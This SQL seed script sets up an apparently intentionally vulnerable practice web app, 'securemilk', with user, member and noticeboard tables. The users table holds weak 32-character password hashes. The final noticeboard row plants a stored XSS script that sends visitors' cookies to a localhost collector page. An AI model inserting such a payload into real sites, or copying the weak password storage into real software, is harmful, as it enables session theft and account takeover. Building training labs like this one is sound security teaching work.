-- Create Database
CREATE DATABASE `securemilk`;

-- Insert a table for users
CREATE TABLE `securemilk`.`users` (
    `id` INT NOT NULL AUTO_INCREMENT PRIMARY KEY,
    `username` VARCHAR(20) NOT NULL,
    `password` CHAR(32) NOT NULL,
	`salt` CHAR(24) NOT NULL
) ENGINE = InnoDB;

-- Insert the securemilk users
INSERT INTO `securemilk`.`users` VALUES (null, 'user', 'DBD50F417158FE7B778D30B5C06B9C7A', "rD4CLcy5VvvFOKVsZHaENg=="); 
INSERT INTO `securemilk`.`users` VALUES (null, 'milk_man', 'BA1BB6E7A580A5245C88A7617FEE7F20', "SaAkwYP3r2gCOMD9OfTnrw=="); 
INSERT INTO `securemilk`.`users` VALUES (null, 'the_boss', '3291C36B590AAE9DDB8CE7D188E46B54', "ZY9gxoEjjMrUaLMbVgHEEA=="); 

-- Create table for employee lookup
CREATE TABLE `securemilk`.`members` (
    `id` INT NOT NULL AUTO_INCREMENT PRIMARY KEY,
    `username` VARCHAR(20) NOT NULL,
    `name` VARCHAR(30) NOT NULL,
    `description` VARCHAR(50) NOT NULL
) ENGINE = InnoDB;

-- Insert securemilk employees
INSERT INTO `securemilk`.`members` VALUES (null, 'user', 'Test User', 'Default test user'); 
INSERT INTO `securemilk`.`members` VALUES (null, 'milk_man', 'Jerry Hill', 'Milk delivery agent'); 
INSERT INTO `securemilk`.`members` VALUES (null, 'the_boss', 'Jenifer Milne', 'Chief executive officer'); 

-- Create table for noticeboard
CREATE TABLE `securemilk`.`noticeboard` (
    `id` INT NOT NULL AUTO_INCREMENT PRIMARY KEY,
    `name` VARCHAR(50) NOT NULL,
    `comments` VARCHAR(300) NOT NULL
) ENGINE = InnoDB;

-- Insert records into noticeboard table
INSERT INTO `securemilk`.`noticeboard` VALUES (null, 'Really Bad Web Developer', 'This is an automated test post. I am a robot!');
INSERT INTO `securemilk`.`noticeboard` VALUES (null, 'TheMilkMan', '<script>new Image().src=”http://localhost/cookie.php?”+document.cookie;</script>');
